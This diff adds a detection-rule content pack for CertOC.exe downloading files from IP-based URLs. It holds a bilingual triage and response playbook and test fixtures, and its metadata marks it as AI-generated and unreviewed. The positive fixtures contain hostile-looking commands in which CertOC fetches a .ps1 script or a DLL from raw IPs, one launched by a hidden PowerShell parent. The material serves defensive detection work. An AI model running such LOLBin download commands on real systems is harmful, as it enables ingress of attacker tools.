@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a",
+    "title": "File Download From IP Based URL Via CertOC.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_certoc_download_direct_ip.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_certoc_download_direct_ip.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó CertOC.exe con la opción -GetCACAPS apuntando a una URL basada en dirección IP, lo que suele indicar la descarga de un archivo desde un servidor sin nombre de dominio.",
+      "what_it_detects": "Procesos cuya Image termina en \\certoc.exe u OriginalFileName es CertOC.exe, con un CommandLine que contiene -GetCACAPS y una URL del tipo ://a.b.c.d (IPv4 literal).",
+      "why_it_matters": "CertOC.exe es un binario firmado de Windows (LOLBin) que puede abusarse para descargar archivos remotos (ATT&CK T1105, transferencia de herramientas). Usar una IP directa evita la resolución DNS y es típico de infraestructura de ataque temporal.",
+      "triage_steps": [
+        "Revise el CommandLine completo: anote la IP, la ruta solicitada y cualquier archivo de destino indicado.",
+        "Identifique el ParentImage y su línea de comandos; scripts, Office, mshta o wscript como padre aumentan la sospecha.",
+        "Confirme el usuario y el host; determine si es un servidor de PKI o administración donde CertOC tenga uso esperado.",
+        "Busque conexiones de red del proceso hacia esa IP y valide su reputación y si pertenece a rangos internos o de proveedores conocidos.",
+        "Revise creación de archivos en el mismo host +/- 15 minutos (carpetas Temp, AppData, ProgramData) y calcule el hash de lo descargado.",
+        "Examine procesos hijos o ejecuciones posteriores que usen el archivo descargado.",
+        "Pivote por la misma IP y el mismo usuario en otros endpoints y busque alertas previas asociadas."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos.",
+        "Administradores de PKI que prueban capacidades de una CA interna usando su dirección IP en lugar del FQDN.",
+        "Scripts de diagnóstico de certificados en laboratorios o entornos sin DNS configurado."
+      ],
+      "response_steps": [
+        "Verifique con el usuario o el equipo de PKI si la ejecución fue legítima antes de actuar.",
+        "Si no hay justificación, aísle el endpoint y bloquee la IP de destino en proxy y firewall.",
+        "Recolecte el archivo descargado, su hash y artefactos del proceso padre para análisis.",
+        "Elimine el payload y cualquier persistencia identificada tras confirmar su naturaleza maliciosa.",
+        "Restablezca credenciales del usuario afectado si hay indicios de compromiso y monitoree la IP en todo el entorno."
+      ],
+      "severity_rationale": "Nivel alto porque el uso de CertOC con -GetCACAPS hacia una IP literal rara vez es legítimo y suele corresponder a descarga de herramientas maliciosas."
+    },
+    "en": {
+      "summary": "CertOC.exe ran with the -GetCACAPS option pointing to an IP-based URL, which usually means a file was downloaded from a server without a domain name.",
+      "what_it_detects": "Processes whose Image ends with \\certoc.exe or OriginalFileName is CertOC.exe, with a CommandLine containing -GetCACAPS and a URL of the form ://a.b.c.d (literal IPv4).",
+      "why_it_matters": "CertOC.exe is a signed Windows binary (LOLBin) that can be abused to fetch remote files (ATT&CK T1105, ingress tool transfer). A raw IP skips DNS and is typical of short-lived attacker infrastructure.",
+      "triage_steps": [
+        "Read the full CommandLine: note the IP, requested path and any output file specified.",
+        "Identify the ParentImage and its command line; scripts, Office, mshta or wscript as parent raise suspicion.",
+        "Confirm the user and host; check whether it is a PKI or admin server where CertOC use is expected.",
+        "Look for network connections from the process to that IP and check its reputation and ownership.",
+        "Review file creation on the same host within +/- 15 minutes (Temp, AppData, ProgramData) and hash the downloaded file.",
+        "Examine child processes or later executions that use the downloaded file.",
+        "Pivot on the same IP and user across other endpoints and check earlier alerts for these entities."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives.",
+        "PKI administrators testing an internal CA's capabilities by IP address instead of FQDN.",
+        "Certificate diagnostic scripts in labs or environments without working DNS."
+      ],
+      "response_steps": [
+        "Confirm with the user or PKI team whether the execution was legitimate before acting.",
+        "If unjustified, isolate the endpoint and block the destination IP at proxy and firewall.",
+        "Collect the downloaded file, its hash and parent process artifacts for analysis.",
+        "Remove the payload and any persistence once confirmed malicious.",
+        "Reset the affected user's credentials if compromise is indicated and monitor the IP environment-wide."
+      ],
+      "severity_rationale": "High because CertOC with -GetCACAPS against a literal IP is rarely legitimate and usually indicates malicious tool download."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "CertOC.exe launched from PowerShell downloading a file from a raw IP URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certoc.exe",
+          "OriginalFileName": "CertOC.exe",
+          "CommandLine": "certoc.exe -GetCACAPS http://192.0.2.15/files/update.ps1",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -nop -w hidden",
+          "CurrentDirectory": "C:\\Users\\jperez\\AppData\\Local\\Temp\\"
+        }
+      },
+      {
+        "description": "Renamed CertOC binary identified by OriginalFileName fetching from an IP over HTTPS",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\ProgramData\\cache\\ctc.exe",
+          "OriginalFileName": "CertOC.exe",
+          "CommandLine": "ctc.exe -GetCACAPS https://203.0.113.44:8443/a.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate CertOC -GetCACAPS query against an internal CA using its FQDN, not an IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "PKI-01",
+          "User": "ANDES\\adm_pki",
+          "Image": "C:\\Windows\\System32\\certoc.exe",
+          "OriginalFileName": "CertOC.exe",
+          "CommandLine": "certoc.exe -GetCACAPS https://ca01.example.com/certsrv/mscep/mscep.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "CertOC used with an IP URL but without -GetCACAPS (different option)",
+        "event": {
+          "EventID": 1,
+          "Computer": "PKI-01",
+          "User": "ANDES\\adm_pki",
+          "Image": "C:\\Windows\\System32\\certoc.exe",
+          "OriginalFileName": "CertOC.exe",
+          "CommandLine": "certoc.exe -ping http://198.51.100.20/certsrv",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
